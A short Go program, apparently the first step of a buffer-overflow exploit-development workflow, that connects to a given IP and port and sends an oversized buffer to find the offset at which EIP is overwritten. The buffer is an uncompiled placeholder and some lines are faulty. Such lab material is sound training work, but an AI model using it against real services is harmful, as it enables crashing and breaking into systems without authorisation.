package main

import (
	"fmt"
	"net"
	"os"
	"os/signal"
	"syscall"
	"time"
)

/* Usage:
   go run 1_spiking_fuzzing.go <IP Address> <Port>
*/

func main() {
	ip := os.Args[1]
	port := os.Args[2]
	address := fmt.Sprintf("%s:%s", ip, port)
	buffer := //Based on at what bytes you get to EIP, generate your pattern and insert it here, example "AAAA"
	conn, err := net.Dial("tcp", address)
		if err != nil {
			fmt.Printf("Connection failed", err.Error())
		}
	_, err = conn.Write([]byte(buffer + "\r\n"))
	if err != nil {
		panic("Connection failed while sending the exploit")
		os.Exit(1)
	}
	conn.Close()
	time.Sleep(1 * time.Second)
		
	inter := make(chan os.Signal, 1)
	signal.Notify(inter, os.Interrupt, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<- inter
		fmt.Print("\r")
		fmt.Printf("Debugger crashed at %d bytes\n", len(buffer))
		os.Exit(1)
	}()
}
